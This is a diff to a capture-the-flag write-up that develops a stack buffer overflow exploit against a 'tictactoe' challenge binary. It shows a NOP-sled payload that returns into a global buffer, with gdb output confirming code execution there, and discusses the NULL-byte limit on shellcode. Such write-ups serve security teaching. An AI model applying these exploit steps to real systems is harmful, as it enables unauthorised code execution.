@@ -389,12 +389,34 @@ Can you see 'x' bit? When present it means that this memory region is executable
 So the next idea that popped into my mind was to jump to `name`. It is a global variable and as binary hasn't been compiled as position independent then we know the exact address of it. The only problem is that we cannot use NULL bytes as it is filled with [3] strncpy. Let's check if we are right and just place some nops and observe the execution flow:
 
 
-`name = b'\x90' * 88 + p64(e.symbols['name']) + b'\x90' * 100`
+`payload = b'\x90' * 88 + p64(e.symbols['name']) + b'\x90' * 100`
 
 ``` bash
 $ gdb ./tictactoe
 gef➤  b *0x4016b3 ; break at ret from get_name
 gef➤  r
-Breakpoint 2 at 0x401716
-gef➤  x/10gx $rsp
+Breakpoint 2 at 0x4016b3
+gef➤  x/1i $rip 
+=> 0x4016b3 <get_name+298>:	ret
+gef➤  x/8gx $rsp
+x/8gx $rsp
+0x7fffffffdd28:	0x0000000000405770	0x9090909090909090
+0x7fffffffdd38:	0x9090909090909090	0x9090909090909090
+0x7fffffffdd48:	0x9090909090909090	0x9090909090909090
+0x7fffffffdd58:	0x9090909090909090	0x9090909090909090
+gef➤  p &name
+$1 = (char (*)[17]) 0x405770 <name>
+gef➤  ni
+gef➤  x/100i $rip
+=> 0x405770 <name>:	nop
+   0x405771 <name+1>:	nop
+   [...]
+   0x4057b7:	nop
+   0x4057b8:	rex.WB add al,0x0
+   0x4057bb:	add    BYTE PTR [rax],al
+   0x4057bd:	add    BYTE PTR [rax],al
+   0x4057bf:	add    BYTE PTR [rax],al
+```
+
+Nice as we do can execute instructions but can you notice that the part after return addres hasn't been copied into the `name` variable? This is because the address of `name` contains NULL byte. This means that we have only 88 bytes and cannot use any NULL bytes for our shellcode. It might be ok if we only need a shell, but as we have to trick server.py to give us a flag it might be not enought.
 
